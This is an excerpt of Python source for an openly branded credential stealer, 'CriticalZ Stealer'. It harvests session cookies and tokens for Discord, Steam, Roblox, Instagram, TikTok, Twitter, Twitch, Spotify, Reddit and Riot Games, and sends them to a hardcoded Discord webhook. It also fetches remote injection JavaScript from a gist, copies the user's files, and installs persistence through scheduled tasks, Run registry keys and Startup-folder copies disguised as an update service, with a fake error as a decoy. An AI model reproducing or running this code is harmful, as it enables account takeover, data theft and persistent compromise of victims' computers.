...
webhook = 'https://discord.com/api/webhooks/1231575065099767859/FEKnVGPLFuh-ZD0L40pBHWVddWbhc0Byvvrrb81wP1q3aAczrNw6duA6mnUlqYD2oJRl'
...
class Main:
    ...
    async def RiotGamesSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                embed_data = {
                    "title": "***CriticalZ Stealer***",
                    "description": f"***CriticalZ Riot Games Session was detected on the {browser} browser***",
                    "url" : "CriticalZ",
                    "color": 0,
                    "footer": {"text": "CriticalZ |Zone/CriticalZ-V2.0"},
                    "thumbnail": {"url": "https://i.hizliresim.com/nl152du.jpg"}}
    ...
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            pp = "https://i.hizliresim.com/nl152du.jpg"
            bio = ""
            fullname = ""
            headers = {
            ...
            embed_data = {
                "title": "***CriticalZ Stealer***",
                "description": f"***CriticalZ Instagram Session was detected on the {browser} browser***",
                "url" : "CriticalZ",
                "color": 0,
                "footer": {"text": "CriticalZ |Zone"},
                "thumbnail": {"url": pp}}
            fields = [
                {"name": "Username", "value": "``" + username + "``", "inline": True},
    ...
    async def TikTokSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***CriticalZ Stealer***",
                "description": f"***CriticalZ Tiktok Session was detected on the {browser} browser***",
                "url" : "CriticalZ",
                "color": 0,
                "footer": {"text": "CriticalZ |Zone"},
                "thumbnail": {"url": "https://i.hizliresim.com/nl152du.jpg"}}
    ...
    async def TwitterSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***CriticalZ Stealer***",
                "description": f"***CriticalZ Twitter Session was detected on the {browser} browser***",
                "url" : "CriticalZ",
                "color": 0,
                "footer": {"text": "CriticalZ |Zone"},
                "thumbnail": {"url": pp}}
    ...
    async def TwitchSession(self, auth_token, username, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***CriticalZ Stealer***",
                "description": f"***CriticalZ Twitch Session was detected on the {browser} browser***",
                "url" : "CriticalZ",
                "color": 0,
                "footer": {"text": "CriticalZ |Zone"},
                "thumbnail": {"url": pp}}
    ...
    async def SpotifySession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***CriticalZ Stealer***",
                "description": f"***CriticalZ Spotify Session was detected on the {browser} browser***",
                "url" : "CriticalZ",
                "color": 0,
                "footer": {"text": "CriticalZ |Zone"},
                "thumbnail": {"url": "https://i.hizliresim.com/nl152du.jpg"}}
    ...
    async def RedditSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***CriticalZ Stealer***",
                "description": f"***CriticalZ Reddit Session was detected on the {browser} browser***",
                "url" : "CriticalZ",
                "color": 0,
                "footer": {"text": "CriticalZ |Zone"},
                "thumbnail": {"url": pp}}
    ...
    async def RobloxSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                ...
                embed_data = {
                    "title": "***CriticalZ Stealer***",
                    "description": f"***CriticalZ Roblox Session was detected on the {browser} browser***",
                    "url" : "CriticalZ",
                    "color": 0,
                    "footer": {"text": "CriticalZ |Zone"},
                    "thumbnail": {"url": pp}}
    ...
    async def ValidateTokenAndGetInfo(self, token:str) -> None:
        try:
            ...
            if data:
                embed_data = {
                "title": "***CriticalZ Stealer***",
                "description": f"***CriticalZ Validated Discord Token Detected***",
                "url" : "CriticalZ",
                "color": 0,
                "footer": {"text": "CriticalZ |Zone"},
                "thumbnail": {"url": ""}}
                    ...
                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                        ...
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                ...
                                embed_data = {
                                    "title": "***CriticalZ Stealer***",
                                    "description": f"***CriticalZ Steam Session Detected***",
                                    "url" : "CriticalZ",
                                    "color": 0,
                                    "footer": {"text": "CriticalZ |Zone"},
    ...
    async def SendAllData(self) -> None:
        ...
        embed_data = {
            "title": "***CriticalZ Stealer***",
            "description": f"***CriticalZ Stealer Full Info***",
            "url" : "CriticalZ",
            "color": 0,
            "footer": {"text": "CriticalZ |Zone"},
            "thumbnail": {"url": "https://i.hizliresim.com/nl152du.jpg"}}
...
class DiscordInjection:
    ...
    async def GetInjectionCode(self) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://gist.githubusercontent.com/crit262/bc3965c629599683ebb8d6e52ed2258a/raw/b19f1aefac18c500a86c9b49d456a661cc654f94/crit,js") as response:
                    data = await response.text()
...
class StealCommonFiles:
    ...
    async def StealFiles(self) -> None:
        try:
            ...
            destination_directory = os.path.join(self.temp, "StealedFilesByCriticalZ")
...
class Startup:
    def __init__(self) -> None:
        ...
        self.ToPath:str = os.path.join(self.LocalAppData, "CriticalZUpdateService", "CriticalZ.exe")
    ...
    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath): # if the startup file already exist, return
                ...
                os.mkdir(self.ToPath.replace("CriticalZ.exe", "")) # Create Directory
    ...
    async def SchtaskStartup(self) -> None: # schtask method for startup
        try:
            command = await asyncio.create_subprocess_shell(
                'schtasks /query /TN "CriticalZUpdateService"',
                shell=True,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE)
            ...
            if not stdout: # if the file not on schtasks
                if self.Privalage: # if the code running on admin privilage, execute the startup command
                    try:
                        onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "CriticalZUpdateService" /tr "{self.ToPath}"'
                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "CriticalZUpdateService2" /tr "{self.ToPath}"'
                    ...
                    if result > 32: # if the user give the admin req close the normal code for execute the admin priv code
                        ...
                        try:
                            command = f'schtasks /create /f /sc daily /ri 30 /tn "CriticalZUpdateService" /tr "{self.ToPath}"'
                            ...
                            process = await asyncio.create_subprocess_shell(
                            f'schtasks /create /f /tn "CriticalZUpdateService" /tr "{self.ToPath}" /sc daily /ri 30',
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                            shell=True)
                            await process.communicate()
    ...
    async def RegeditStartup(self) -> None: # regedit method for startup
        try:
            if not self.Privalage: # if the code not running admin privilage, copy to HKCU
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "CriticalZ Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
                ...
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "CriticalZ Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
    ...
    async def FolderStartup(self): # folder method for startup
        try:
            if self.Privalage: #if the code running admin privilage, copy to common startup path
                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\CriticalZ.exe"):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\CriticalZ.exe")
            else: #if the code not running admin privilage, copy to normal startup path
                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "CriticalZ.exe")):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "CriticalZ.exe"))
        except Exception as e:
            print(str(e))
...
async def Fakerror() -> None:
    try:
        if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(os.getenv("LOCALAPPDATA"), "CriticalZUpdateService", "CriticalZ.exe"):
...
if __name__ == '__main__':
    if os.name == "nt":
        if not SubModules.create_mutex("CriticalZ | Stealar | on top |"):
        ...
        print("just Windows Operating system's supported by CriticalZ")
